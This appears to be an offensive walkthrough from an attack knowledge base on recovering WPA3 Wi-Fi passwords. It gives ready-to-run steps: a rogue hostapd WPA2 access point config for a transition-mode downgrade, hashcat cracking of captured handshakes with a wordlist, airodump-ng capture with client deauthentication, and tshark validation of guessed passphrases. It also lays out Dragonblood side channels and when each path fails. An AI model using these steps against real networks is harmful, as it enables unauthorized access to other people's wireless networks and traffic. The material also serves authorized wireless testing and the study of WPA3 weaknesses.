# WPA3 — walkthrough

Offline dictionary attack on the SAE PMK is *not* the fast path.
SAE resists it by design. Reach for these in order.

## Path A — Transition-mode downgrade (fastest lane)

If the RSN IE carries both AKM 2 (PSK) and AKM 8 (SAE), the WPA2 side
is a full backdoor to the WPA3 password (they share the passphrase in
every transition deployment).

```
# See dragonblood-deep/walkthrough.md Path A. Short form:
cat > /tmp/wpa2rogue.conf <<EOF
interface=wlan1
ssid=<TargetSSID>
hw_mode=g
channel=6
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase=whatever   # placeholder; the client's 4-way is what we want
EOF
hostapd /tmp/wpa2rogue.conf

# WPA2 4-way lands via any WPA2-capable client that fails over.
# Convert + crack:
hcxpcapngtool -o /tmp/hs.22000 <capture>.pcapng
hashcat -m 22000 /tmp/hs.22000 rockyou.txt
```

## Path B — Dragonblood side channels

Only useful when the target advertises SAE (AKM 8) **without** the
RSNXE H2E bit set. H2E is signaled by RSNXE bit 5, not by an AKM
number. See `dragonblood-deep/walkthrough.md`.

## Path C — Force a fresh SAE handshake, harvest for correctness

The SAE 4-way isn't crackable offline, but the *handshake exists* —
and Wireshark decrypt with a known PSK is still an option for
verifying that a passphrase guess is right.

```
# 1. Confirm the target's AKM.
airodump-ng --band abg -c <channel> --bssid <BSSID> -w /tmp/wpa3 wlan1mon

# 2. Kick a client if PMF is off (rare on WPA3 — it mandates PMF).
#    Otherwise, wait for natural reassoc.

# 3. Wireshark decryption test — supply a candidate passphrase
#    and ESSID; check whether the resulting PTK decrypts data frames.
tshark -r /tmp/wpa3-01.pcapng \
  -o "wlan.enable_decryption:TRUE" \
  -o "uat:80211_keys:\"wpa-pwd\",\"CandidatePassword:CorpWiFi\"" \
  -Y "eapol"
```

If the candidate is right, subsequent data frames decrypt. If wrong,
they don't. This is how you *validate* a passphrase you got from a
side channel or a leaked source.

## Path D — Wait for a bad implementation

Some hostapd builds prior to 2.11 misapply H2E under specific
interoperability paths. Some client supplicants (older Android) fall
back to the hunt loop when both AKMs are offered. Recognition rules
are in `wpa3/reference.md`.

## Failure modes

- **PMF-required is truly enforced.** Broadcast deauth is a no-op;
  you cannot force a reassoc. Only naturally-roaming clients yield
  a capture.
- **AKM 24 (SAE-EXT-KEY) alone, no AKM 2 or AKM 8.** Hardened
  (implies H2E and GCMP-256). Move on unless the client has a
  weak-cert-validation issue (enterprise path — see
  `cert-phish-eaphammer-weak-validation`).
- **Client rejects transition-mode.** 2024+ enterprise supplicants
  reject transition-mode APs entirely. Path A closes.

## Cite

- IEEE Std 802.11-2020 §12.4 (SAE).
- Wi-Fi Alliance WPA3 Specification.
- Vanhoef & Ronen 2019 — Dragonblood.
- attacks.json: `wpa3-transition-downgrade`,
  `dragonblood-sidechannel`, `dragonblood-timing`.
